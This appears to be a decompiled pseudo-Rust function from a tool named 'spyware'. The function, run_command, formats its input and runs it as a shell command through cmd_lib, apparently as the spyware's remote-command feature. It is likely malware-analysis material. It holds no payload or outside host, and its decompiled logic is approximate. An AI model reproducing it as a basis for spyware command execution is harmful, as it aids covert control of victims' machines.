fn spyware::actions::commands::run_command(a0: u64, a1: u64, a2: u64) -> void {
    let v0: alloc::string::String;  // [bp-0x70]
    let v1: u64;  // [bp-0x58]
    let v2: Result<struct4, struct8>;  // [bp-0x50]
    let v3: struct24;  // [bp-0x48]
    let v4: u64;  // [bp-0x40]
    let v5: &str;  // [bp-0x38]
    let v6: i64;  // [bp-0x28]
    let v7: u64;  // [bp-0x20]
    let v8: void*;  // [bp-0x18]
    let v10: u64;  // rcx
    let v11: u64;  // r8

    v1 = a1;
    v2 = a2;
    v3 = &v1;
    v4 = <&T as core::fmt::Display>::fmt;
    v5 = "\x01";
    v8 = 0;
    v6 = &v3;
    v7 = 1;
    v0 = core::option::Option<T>::map_or_else(&v5 as u64, a2, v10, v11);
    cmd_lib::run_fun(a0, v0);
    return;
}
